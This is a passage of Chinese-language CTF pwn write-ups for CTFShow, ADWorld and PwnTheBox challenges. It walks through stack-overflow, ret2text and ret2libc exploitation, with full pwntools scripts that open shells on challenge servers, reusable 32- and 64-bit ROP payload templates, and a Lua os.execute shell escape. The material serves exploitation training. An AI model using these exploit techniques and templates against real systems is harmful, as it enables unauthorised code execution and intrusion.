这道题没有附件，`nc`进去之后就是玩游戏，输入`help`后发现这是个`lua`程序，而下面的乱码像是`lua`的字节码。

```bash
nc 111.200.241.244 53412
help
os.execute("/bin/sh")
ls
cat flag
```

输入`os.execute("/bin/sh")`可以调用`shell`，`ls`后`cat flag`可以得到`cyberpeace{bd2ac997dde16e9d40620def86a5df67}`。

![](https://paper.tanyaodan.com/ADWorld/pwn/5009/1.png)

------

## CTFShow

### pwn02

先`file ./stack`查看文件类型再`checksec --file=stack`检查一下文件保护情况。

![](https://paper.tanyaodan.com/CTFShow/pwn02/1.png)

用`IDA Pro 32bit`打开附件`stack`，按`F5`反汇编源码并查看主函数，发现`pwnme()`函数很可疑。

![](https://paper.tanyaodan.com/CTFShow/pwn02/2.png)

双击`pwnme()`函数可以看到该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0x9`，即可用栈大小只有`9`字节，但是`fgets()`函数限制输入50个字节，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/CTFShow/pwn02/3.png)

双击`s`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`9`个字节占满`s`变量，然后再加上`r`的`4`个字节。

![](https://paper.tanyaodan.com/CTFShow/pwn02/4.png)

在`Function Window`中注意到有一个名为`stack()`的函数，函数返回值直接是系统调用，因此构造`payload`时需要再加上这个`stack()`函数的起始地址即可。

![](https://paper.tanyaodan.com/CTFShow/pwn02/5.png)

编写`Python`代码即可得到`ctfshow{62a18b45-a931-4c43-9a7a-21726633f01e}`。

![](https://paper.tanyaodan.com/CTFShow/pwn02/6.png)

------

### pwn05

先`file ./pwn05`查看文件类型再`checksec --file=pwn05`检查一下文件保护情况。

![](https://paper.tanyaodan.com/CTFShow/pwn05/1.png)

用`IDA Pro 32bit`打开附件`pwn05`，按`F5`反汇编源码并查看主函数，发现`welcome()`函数很可疑。

![](https://paper.tanyaodan.com/CTFShow/pwn05/2.png)

双击进入`welcome()`函数，可以看到该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0x14`，但是`gets()`函数并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/CTFShow/pwn05/3.png)

双击`s`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x14`个字节占满`s`变量，然后再加上`r`的`4`个字节。

![](https://paper.tanyaodan.com/CTFShow/pwn05/4.png)

在`Function Window`中注意到有一个名为`getFlag()`的函数，函数返回值直接是系统调用，因此构造`payload`时需要再加上这个`getFlag()`函数的起始地址即可。

![](https://paper.tanyaodan.com/CTFShow/pwn05/5.png)

编写`Python`代码即可得到`ctfshow{ea894e9a-2450-417a-92f3-7ff289ce115e}`。

```python
from pwn import *

io = remote('pwn.challenge.ctf.show', 28182)
e = ELF('pwn05')
address = e.symbols['getFlag']
log.success('getFlag_address => %s' % hex(address).upper())
payload = b'a'*(0x14 + 0x4) + p32(address)
# payload = b'a'*(0x14 + 0x4) + p32(0x8048486)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/CTFShow/pwn05/6.png)

------

### pwn06

先`file ./pwn06`查看文件类型和`checksec --file=pwn06`检查一下文件保护情况。

![](https://paper.tanyaodan.com/CTFShow/pwn06/1.png)

用`IDA Pro 64bit`打开附件`pwn06`，按`F5`反汇编源码并查看主函数，发现`welcome()`函数很可疑。

![](https://paper.tanyaodan.com/CTFShow/pwn06/2.png)

双击进入`welcome()`函数，可以看到该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0xc`，但是`gets()`函数并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/CTFShow/pwn06/3.png)

双击`s`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x14`个字节占满`s`变量，然后再加上`r`的`8`个字节。

![](https://paper.tanyaodan.com/CTFShow/pwn06/4.png)

需要注意的是这题`pwn06`就是上一题`pwn05`的`64`位版本，所以需要加上`welcome()`函数的起始地址来平衡堆栈。

在`Function Window`中注意到有一个名为`getFlag()`的函数，函数返回值直接是系统调用，因此构造`payload`时需要再加上这个`getFlag()`函数的起始地址即可。

![](https://paper.tanyaodan.com/CTFShow/pwn06/5.png)

编写`Python`代码即可得到`ctfshow{384e6120-ef80-45f0-afe9-f64929450397}`。

```python
from pwn import *

io = remote('pwn.challenge.ctf.show', 28194)
e = ELF('pwn06')
welcome_address = e.symbols['welcome']
log.success('welcome_address => %s' % hex(welcome_address).upper())
getFlag_address = e.symbols['getFlag']
log.success('getFlag_address => %s' % hex(getFlag_address).upper())
payload = b'a'*0xc + b'fuckpwn!' + p64(welcome_address) + p64(getFlag_address)
# payload = b'a'*0xc + b'fuckpwn!' + p64(0x40058F) + p64(0x400577)
io.sendline(payload)
io.interactive()
```

------

### ret2text

先`file ./ret2text`查看文件类型再`checksec --file=ret2text`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/CTFShow/ret2text/1.png)

用`IDA Pro 64bit`打开附件`ret2text`，按`F5`反汇编源码并查看主函数，发现`welcome()`函数很可疑。

![](https://paper.tanyaodan.com/CTFShow/ret2text/2.png)

双击`welcome()`函数查看详情，发现该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0x80`，即可用栈大小只有`128`字节，但是`gets()`函数读取输入到变量`s`时并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/CTFShow/ret2text/3.png)

在`Function Window`中注意到有一个名为`ctfshow()`的函数，函数返回值直接是系统调用`system('/bin/sh')`。

![](https://paper.tanyaodan.com/CTFShow/ret2text/4.png)

构造`payload`时可以先用`0x80`个字节占满`s`变量，再加上`rbp`的`8`个字节，然后加上`ctfshow()`函数的起始地址即可。然而我第一次编写的`Python`代码直接超时啦`timeout: the monitored command dumped core`。

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
# io = process('ret2text')
io = remote('pwn.challenge.ctf.show', 28067)
e = ELF('ret2text')
ctfshow_address = e.symbols['ctfshow']
log.success('ctfshow_address => %s' % hex(ctfshow_address).upper())
payload = b'a'*0x80 + b'fuckpwn!' + p64(ctfshow_address)
# payload = b'a'*0x80 + b'fuckpwn!' + p64(0x400637)
io.sendline(payload)
io.interactive()
```

那`payload`就不要加上`ctfshow()`函数的起始地址了，直接添加系统调用`system('/bin/sh')`的地址`0x40063B`。

![](https://paper.tanyaodan.com/CTFShow/ret2text/5.png)

编写`Python`代码即可得到`ctfshow{19efd671-89fa-4f27-8898-aaedfea5bb2c}`。

```python
from pwn import *

io = remote('pwn.challenge.ctf.show', 28067)
payload = b'a'*0x80 + b'fuckpwn!' + p64(0x40063B)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/CTFShow/ret2text/6.png)

------

### pwn03

先`file ./pwn03`查看文件类型再`checksec --file=pwn03`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/CTFShow/pwn03/1.png)

用`IDA Pro 32bit`打开附件`pwn03`，按`F5`反汇编源码并查看主函数，发现`pwnme()`函数很可疑。

![](https://paper.tanyaodan.com/CTFShow/pwn03/2.png)

双击`pwnme()`函数查看详情，发现该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0x9`，即可用栈大小只有`9`字节，但是`fgets()`函数读取输入到变量`s`时限制输入`100`个字节，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/CTFShow/pwn03/3.png)

双击`s`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x9`个字节占满`s`变量，然后再加上`r`的`4`个字节。

![](https://paper.tanyaodan.com/CTFShow/pwn03/4.png)

在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`puts()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并通过`puts()`函数泄露`puts()`函数在`got`表中的真实地址后，进而判断`libc`的版本，然后我们可以根据`libc`版本中`puts()`函数的偏移地址来计算出`libc`的基址地址，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，从而构造`shellcode`拿到`flag`。

编写`Python`代码即可得到`ctfshow{c7611c91-203e-47de-ac92-e0f850aa9135}`。

```python
from pwn import *
from LibcSearcher import *

context(arch='i386', os='linux', log_level='debug')
# io = process('pwn03')
io = remote('pwn.challenge.ctf.show', 28067)
e = ELF('pwn03')
puts_plt = e.plt['puts']
log.success('puts_plt => %s' % hex(puts_plt))
puts_got = e.got['puts']
log.success('puts_got => %s' % hex(puts_got))
main_address = e.symbols['main']
log.success('main_address => %s' % hex(main_address))
# 先让栈溢出，再利用puts函数的plt表地址来泄露puts函数got表中的真实地址
payload = b'a'*0x9 + b'fuck' + p32(puts_plt) + p32(main_address) + p32(puts_got)
io.sendline(payload)
io.recvuntil('\n\n')
puts_address = u32(io.recv(4)) # 接收4个字节并解包
log.success('puts_address => %s' % hex(puts_address))
libc = LibcSearcher('puts', puts_address) # 获取libc版本,libc6-i386_2.27-3ubuntu1_amd64
libcbase = puts_address - libc.dump('puts')  # libc的基址=puts()函数地址-puts()函数偏移地址(0x67360)
log.success('libcbase_address => %s' % hex(libcbase))
system_address = libcbase + libc.dump('system') # system()函数的地址=libc的基址+system()函数偏移地址(0x03cd10)
log.success('system_address => %s' % hex(system_address))
bin_sh_address = libcbase + libc.dump('str_bin_sh') # '/bin/sh'的地址=libc的基址+'/bin/sh'偏移地址(0x17b8cf)
log.success('bin_sh_address => %s' % hex(bin_sh_address))
payload = b'a'*0x9 + b'fuck' + p32(system_address) + p32(0xdeadbeef) + p32(bin_sh_address)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/CTFShow/pwn03/5.png)

------

### pwn07

先`file ./pwn07`查看文件类型再`checksec --file=pwn07`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/CTFShow/pwn07/1.png)

用`IDA Pro 64bit`打开附件`pwn07`，按`F5`反汇编源码并查看主函数，发现`welcome()`函数很可疑。

![](https://paper.tanyaodan.com/CTFShow/pwn07/2.png)

双击`welcome()`函数查看详情，发现该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0xc`，即可用栈大小只有`12`字节，但是`gets()`函数读取输入到变量`s`时并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/CTFShow/pwn07/3.png)

双击`s`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0xc`个字节占满`s`变量，然后再加上`r`的`4`个字节。

![](https://paper.tanyaodan.com/CTFShow/pwn07/4.png)

有没有发现这题`pwn07`和上面的`pwn03`很像？没错，这简直就是`pwn03`的`64`位版本，不过在`64`位程序中，函数的前`6`个参数是通过寄存器传递的，分别是`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`(当参数小于`7`时)，所以我们需要用`ROPgadget`找到`pop_rdi`和`pop_ret`的地址。

```bash
ROPgadget --binary ./pwn07 --only "pop|ret"
```

![](https://paper.tanyaodan.com/CTFShow/pwn07/5.png)

解题思路都是：在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`puts()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并通过`puts()`函数泄露`puts()`函数在`got`表中的真实地址后，进而判断`libc`的版本，然后我们可以根据`libc`版本中`puts()`函数的偏移地址来计算出`libc`的基址地址，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，从而构造`shellcode`拿到`flag`。这种类型的题还是有一定套路的：

```python
e = ELF('pwn')
# 获取32位版本的got表中的xx函数真实地址,再根据libc中xx函数的偏移地址来算出libc的基址地址
payload = b'a'*offset + p32(e.plt['xx']) + p32(ret_address) + p32(e.got['xx'])
# 根据libc的基址地址和偏移地址算出system()和'/bin/sh'的真实地址后,构造32位版本的shellcode
payload = b'a'*offset + p32(system_address) + p32(0) + p32(bin_sh_address) #p32(0xdeadbeef)或p32(0)或b'a'*4

# 获取64位版本的got表中的xx函数真实地址,再根据libc中xx函数的偏移地址来算出libc的基址地址
payload = b'a'*offset + p64(pop_rdi) + p64(e.got['xx']) + p64(e.plt['xx']) + p64(ret_address)
# 根据libc的基址地址和偏移地址算出system()和'/bin/sh'的真实地址后,构造64位版本的shellcode
payload = b'a'*offset + p64(ret_address) + p64(pop_rdi) + p64(bin_sh_address) + p64(system_address)
```

编写`Python`代码即可得到`ctfshow{03a97f04-a802-4c2e-a013-b86a120f034f}`。

```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
# io = process('pwn07')
io = remote('pwn.challenge.ctf.show', 28199)
e = ELF('pwn07')
puts_plt = e.plt['puts']
log.success('puts_plt => %s' % hex(puts_plt))
puts_got = e.got['puts']
log.success('puts_got => %s' % hex(puts_got))
pop_rdi = 0x4006e3 # ROPgadget --binary ./pwn07 --only "pop|ret"
main_address = e.symbols['main']
log.success('main_address => %s' % hex(main_address))
payload = b'a'*0xc + b'fuckpwn!' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_address)
io.sendline(payload)
io.recvline()
puts_address = io.recv().strip(b'\n')
log.success('io.recv().strip(b\\n\') => %s', puts_address)
puts_address = u64(puts_address.ljust(8, b'\x00'))  # 地址只有6bytes, 补到8位才能unpack
log.success('puts_address => %s' % hex(puts_address))
libc = LibcSearcher('puts', puts_address) # 获取libc版本, libc6_2.31-8_amd64
libcbase = puts_address - libc.dump('puts') # libc的基址=puts()函数地址-puts()函数偏移地址
log.success('libcbase_address => %s' % hex(libcbase))
system_address = libcbase + libc.dump('system')
log.success('system_address => %s' % hex(system_address)) # system()函数的地址=libc的基址+system()函数偏移地址
bin_sh_address = libcbase + libc.dump('str_bin_sh') # '/bin/sh'的地址=libc的基址+'/bin/sh'偏移地址
log.success('bin_sh_address => %s' % hex(bin_sh_address))
pop_ret = 0x4004c6 # ROPgadget --binary ./pwn07 --only "pop|ret"
payload = b'a'*0xc + b'fuckpwn!' + p64(pop_ret) + p64(pop_rdi) + p64(bin_sh_address) + p64(system_address) 
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/CTFShow/pwn07/6.png)

------

### babystack

同[**bjdctf_2020_babystack**](https://buuoj.cn/challenges#bjdctf_2020_babystack)

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
# io = process('./ret2text')
io = remote('pwn.challenge.ctf.show', 28117)
e = ELF('./ret2text')
io.sendlineafter(b'Please input the length of your name:', b'100')
backdoor_address = e.symbols['backdoor'] # 0x4006E6
log.success('backdoor_address => %s' % hex(backdoor_address))
payload = b'a'*0x10 + b'fuckpwn!' + p64(backdoor_address)
io.sendlineafter(b'What\'s u name?', payload)
io.interactive()
```

### babyroute

同[**bjdctf_2020_babyrop**](https://buuoj.cn/challenges#bjdctf_2020_babyrop)

```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('pwn.challenge.ctf.show', 28052)
e = ELF('./babyrouter')
puts_plt = e.plt['puts']
log.success('puts_plt => %s' % hex(puts_plt))
puts_got = e.got['puts']
log.success('puts_got => %s' % hex(puts_got))
main_address = e.symbols['main']
log.success('main_address => %s' % hex(main_address))
pop_rdi = 0x400733 # ROPgadget --binary ./babyrouter --only "pop|ret"
payload = b'a'*0x20 + b'fuckpwn!' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_address)
io.sendlineafter(b'Pull up your sword and tell me u story!\n', payload)
puts_address = u64(io.recvline().strip(b'\n').ljust(8, b'\x00'))
log.success('puts_address => %s' % hex(puts_address))
libc = LibcSearcher('puts', puts_address) # 获取libc版本, libc6_2.23-0ubuntu11_amd64
libcbase = puts_address - libc.dump('puts') # libc的基址=puts()函数地址-puts()函数偏移地址
log.success('libcbase_address => %s' % hex(libcbase))
system_address = libcbase + libc.dump('system') # system()函数的地址=libc的基址+system()函数偏移地址
log.success('system_address => %s' % hex(system_address))
bin_sh_address = libcbase + libc.dump('str_bin_sh') # '/bin/sh'的地址=libc的基址+'/bin/sh'偏移地址
log.success('bin_sh_address => %s' % hex(bin_sh_address))
pop_ret = 0x4004c9 # ROPgadget --binary ./babyrouter --only "pop|ret"
payload = b'a'*0x20 + b'fuckpwn!' + p64(pop_ret) + p64(pop_rdi) + p64(bin_sh_address) + p64(system_address)
io.sendlineafter(b'Pull up your sword and tell me u story!\n', payload)
io.interactive()
```

------

### 1024_happy_stack

先`file ./1024_happy_stack`查看文件类型再`checksec --file=1024_happy_stack`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/CTFShow/1024_happy_stack/1.png)

用`IDA Pro 64bit`打开附件`1024_happy_stack`，按`F5`反汇编源码并查看主函数，发现有个`char`型数组变量`s`，`s`的长度只有`0x380`，但是`gets()`函数读取输入到变量`s`时并没有限制输入，显然存在栈溢出漏洞。注意到`ctfshow()`函数的返回值为真时会结束程序。

![](https://paper.tanyaodan.com/CTFShow/1024_happy_stack/2.png)

双击`ctfshow()`函数查看详情，函数返回值直接是`strcmp()`的比较结果。`strcmp()`函数是用于比较两个字符串并根据比较结果返回整数。基本形式为`strcmp(str1,str2)`，若`str1=str2`，则返回零；若`str1<str2`，则返回负数；若`str1>str2`，则返回正数。也就是说从`main()`函数中传入的参数和字符串`"36D"`的`strcmp()`比较结果必须为`0`才能执行主函数中的`puts()`函数。有什么办法能够让变量`s`造成栈溢出的同时又能与`"36D"`的比较结果相等呢？构造`payload`时可以利用`\x00`来让`s`和`"36D"`匹配上。

![](https://paper.tanyaodan.com/CTFShow/1024_happy_stack/3.png)

在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`puts()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并通过`puts()`函数泄露`puts()`函数在`got`表中的真实地址后，进而判断`libc`的版本，然后我们可以根据`libc`版本中`puts()`函数的偏移地址来计算出`libc`的基址地址，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，从而构造`shellcode`拿到`flag`。

在`64`位程序中，函数的前`6`个参数是通过寄存器传递的，分别是`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`(当参数小于`7`时)，所以我们需要用`ROPgadget`找到`pop_rdi`和`pop_ret`的地址。

![](https://paper.tanyaodan.com/CTFShow/1024_happy_stack/4.png)

编写`Python`代码即可得到`ctfshow{ed60fbe2-5815-456a-abc1-4b45fd120cf0}`。

```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('pwn.challenge.ctf.show', 28088)
# io = process('./1024_happy_stack')
e = ELF('./1024_happy_stack')
payload = b'36D\x00'.ljust(0x388, b'a')
pop_rdi = 0x400803 # ROPgadget --binary ./1024_happy_stack --only "pop|ret"
puts_plt = e.plt['puts']
info('puts_plt => 0x%x', puts_plt)
puts_got = e.got['puts']
info('puts_got => 0x%x', puts_got)
main_address = e.symbols['main']
payload += flat(pop_rdi, puts_got, puts_plt, main_address)
io.recv()
io.sendline(payload)
io.recvuntil(b'36D\n')
puts_address = u64(io.recv(6).ljust(8, b'\x00'))
log.success('puts_address => 0x%x', puts_address)
pop_ret = 0x40028a # ROPgadget --binary ./1024_happy_stack --only "pop|ret"
libc = LibcSearcher('puts', puts_address) # 获取libc版本, libc6_2.27-3ubuntu1_amd64
libcbase = puts_address - libc.dump('puts')
system_address = libcbase + libc.dump('system')
info('system_address => 0x%x', system_address)
bin_sh_address = libcbase + libc.dump(('str_bin_sh'))
info('bin_sh_address => 0x%x', bin_sh_address)
payload = b'36D\x00'.ljust(0x388, b'a')
payload += flat(pop_ret, pop_rdi, bin_sh_address, system_address)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/CTFShow/1024_happy_stack/5.png)

------

------

### 1024_happy_checkin

先`file ./1024_happy_checkin`查看文件类型再`checksec --file=1024_happy_checkin`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/CTFShow/1024_happy_checkin/1.png)

用`IDA Pro 64bit`打开附件`1024_happy_checkin`，按`F5`反汇编源码并查看主函数，发现有个`char`型数组变量`s`，`s`的长度只有`0x370`，但是`gets()`函数读取输入到变量`s`时并没有限制输入，显然存在栈溢出漏洞。

在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`puts()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并通过`puts()`函数泄露`puts()`函数在`got`表中的真实地址后，进而判断`libc`的版本，然后我们可以根据`libc`版本中`puts()`函数的偏移地址来计算出`libc`的基址地址，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，从而构造`shellcode`拿到`flag`。

![](https://paper.tanyaodan.com/CTFShow/1024_happy_checkin/2.png)

在`64`位程序中，函数的前`6`个参数是通过寄存器传递的，分别是`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`(当参数小于`7`时)，所以我们需要用`ROPgadget`找到`pop_rdi`和`pop_ret`的地址。

```bash
ROPgadget --binary ./1024_happy_checkin --only "pop|ret"
```

![](https://paper.tanyaodan.com/CTFShow/1024_happy_checkin/3.png)

编写`Python`代码即可得到`ctfshow{851446cc-4ff9-4a2b-945d-f901ca234ba8}`。

```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('pwn.challenge.ctf.show', 28107)
e = ELF('./1024_happy_checkin')
pop_rdi = 0x4006e3 # ROPgadget --binary ./1024_happy_checkin --only "pop|ret"
puts_plt = e.plt['puts']
info('puts_plt => 0x%x', puts_plt)
puts_got = e.got['puts']
info('puts_got => 0x%x', puts_got)
main_address = e.symbols['main']
info('main_address => 0x%x', main_address)
payload = b'a'*0x370 + b'pwn1024!' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_address)
io.sendlineafter(b'welcome_to_ctfshow_1024_cup,input_your_ticket\n', payload)
io.recvline()
puts_address = u64(io.recv(6).ljust(8, b'\x00'))
libc = LibcSearcher('puts', puts_address) # libc版本, libc6_2.27-0ubuntu3_amd64 or libc6_2.27-3ubuntu1_amd64
pop_ret = 0x4004c6 # ROPgadget --binary ./1024_happy_checkin --only "pop|ret"
libcbase = puts_address - libc.dump('puts')
log.success('libcbase_address => %s', hex(libcbase))
system_address = libcbase + libc.dump('system')
info('system_address => 0x%x', system_address)
bin_sh_address = libcbase + libc.dump('str_bin_sh')
info('bin_sh_address => 0x%x', bin_sh_address)
payload = b'a'*0x370 + b'pwn1024!' + p64(pop_ret) + p64(pop_rdi) + p64(bin_sh_address) + p64(system_address)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/CTFShow/1024_happy_checkin/4.png)

------

## PwnTheBox

### [others shellcode](https://ce.pwnthebox.com/challenges?id=476)

先`file ./wustctf2020_number_game  `查看文件类型，再`checksec --file=./wustctf2020_number_game  `检查一下文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ file ./shell_asm                                                                         
./shell_asm: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c1e8d8e26946c6b08794abdad991e3909e1bdc7f, not stripped
                                                                                                    
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
└─$ checksec --file=./shell_asm                                                    
[*] '/home/tyd/ctf/pwn/pwnthebox/shell_asm'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

使用`IDA pro 32bit`打开附件`b0verfl0w`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  getShell();
  return 0;
}
```

双击`getShell()`函数查看详情：

```c
int getShell()
{
  int result; // eax
  char v1[9]; // [esp-Ch] [ebp-Ch] BYREF

  strcpy(v1, "/bin//sh");
  result = 11;
  __asm { int     80h; LINUX - sys_execve }
  return result;
}
```

直接`nc redirect.do-not-trust.hacking.run 10131`进靶机，`cat flag`拿到`PTB{4dc758b3-31e2-434d-af1a-bfc082c51671}`。当然也可以用`pwntools`练习，编写`Python`脚本连接`redirect.do-not-trust.hacking.run`的监听端口`10131`，发送`payload`即可得到`PTB{4dc758b3-31e2-434d-af1a-bfc082c51671}`，提交即可。

```python
from pwn import *

io = remote('redirect.do-not-trust.hacking.run', 10131)
io.sendline(b'cat flag')
io.interactive()
```

------

### [tutorial1](https://ce.pwnthebox.com/challenges?type=4&id=948)

先`file ./tutorial1`查看文件类型再`checksec --file=./tutorial1`检查了一下文件保护情况。

使用`IDA pro 64bit`打开附件`tutorial1`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int buf; // [rsp+0h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  puts("   _  __       ____  _       __ ");
  puts("  | |/ /____  / __ \\(_)___  / /_");
  puts("  |   // __ \\/ / / / / __ \\/ __/");
  puts("  /   |/ /_/ / /_/ / / / / / /_ ");
  puts(" /_/|_/ .___/\\____/_/_/ /_/\\__/  ");
  puts("     /_/                         ");
  puts("Welcome, freshman!");
  puts("This is your first pwn challenge, right?");
  puts("Try to get into backdoor!");
  puts("Tell me your secret number:");
  read(0, &buf, 4uLL);
  if ( buf == -1162167622 ) // 0BABABABAh
    backdoor();
  else
    puts("Well, you don't know the trick yet?");
  return 0;
}
```

当用户输入的`buf`变量为`0xbabababa`时会执行`backdoor()`函数，双击`backdoor()`函数查看详情，可以看到函数返回值直接是`system("/bin/sh")`。

```c
int backdoor()
{
  puts("Well done! Go get your flag!");
  return system("/bin/sh");
}
```

编写`Python`代码获取靶机的`shell`权限，`cat flag`拿到本题`flag`，提交`PTB{073e2a21-2013-44e8-992b-549d973b333c}`即可。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10134)
io.sendlineafter(b':', p64(0xbabababa))
io.interactive()
```

![](https://paper.tanyaodan.com/PwnTheBox/948/1.png)

------

### [tutorial2](https://ce.pwnthebox.com/challenges?type=4&id=949)

先`file ./tutorial2`查看文件类型再`checksec --file=./tutorial2`检查了一下文件保护情况。

使用`IDA pro 64bit`打开附件`tutorial2`，按`F5`反汇编源码并查看主函数。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void (*v4)(void); // [rsp+8h] [rbp-18h] BYREF
  int buf; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  puts("'##::::'##:'########::::'#####:::'####:'##::: ##:'########:");
  puts(". ##::'##:: ##.... ##::'##.. ##::. ##:: ###:: ##:... ##..::");
  puts(":. ##'##::: ##:::: ##:'##:::: ##:: ##:: ####: ##:::: ##::::");
  puts("::. ###:::: ########:: ##:::: ##:: ##:: ## ## ##:::: ##::::");
  puts(":: ## ##::: ##.....::: ##:::: ##:: ##:: ##. ####:::: ##::::");
  puts(": ##:. ##:: ##::::::::. ##:: ##::: ##:: ##:. ###:::: ##::::");
  puts(" ##:::. ##: ##:::::::::. #####:::'####: ##::. ##:::: ##::::");
  puts("..:::::..::..:::::::::::.....::::....::..::::..:::::..:::::");
  puts("Let's try something cooler!");
  puts("Tell me your secret number again:");
  read(0, &buf, 4uLL);
  if ( buf == -559038737 )  //0DEADBEEFh
  {
    puts("Oh, where to go?");
    read(0, &v4, 4uLL);
    v4();
  }
  else
  {
    puts("Well, you don't know the trick yet?");
  }
  return 0;
}
```

当用户输入的`buf`变量为`0xdeadbeef`时会输出`where to go?`语句，并执行用户输入的地址所存放的函数。在`Functions window`中有一个起始地址为`0x4006E6`的`backdoor()`函数，双击`backdoor()`函数查看详情，可以看到函数返回值直接是`system("/bin/sh")`。

```c
int backdoor()
{
  puts("Well done! Go get your flag!");
  return system("/bin/sh");
}
```

编写`Python`代码获取靶机的`shell`权限，`cat flag`拿到本题`flag`，提交`PTB{ede6ccfd-7923-41a1-8f6c-3066b1ba1bb2}`即可。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10133)
e = ELF('./tutorial2')
io.recvuntil(':')
io.send(p32(0xdeadbeef))
backdoor = e.symbols['backdoor'] # 0x4006e6
io.recvuntil('?')
io.send(p64(backdoor))
io.interactive()
```

![](https://paper.tanyaodan.com/PwnTheBox/949/1.png)

------

### [pwn1](https://ce.pwnthebox.com/challenges?type=4&id=365)

先`file ./pwn1_sctf_2016`查看文件类型再`checksec --file=pwn1_sctf_2016`检查一下文件保护情况。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/1.png)

用`IDA Pro 32bit`打开`pwn1_sctf_2016`后按`F5`反汇编源码并查看主函数，发现`vuln()`函数。

![](https://paper.tanyaodan.com/BUUCTF/pwn1_sctf_2016/2.png)

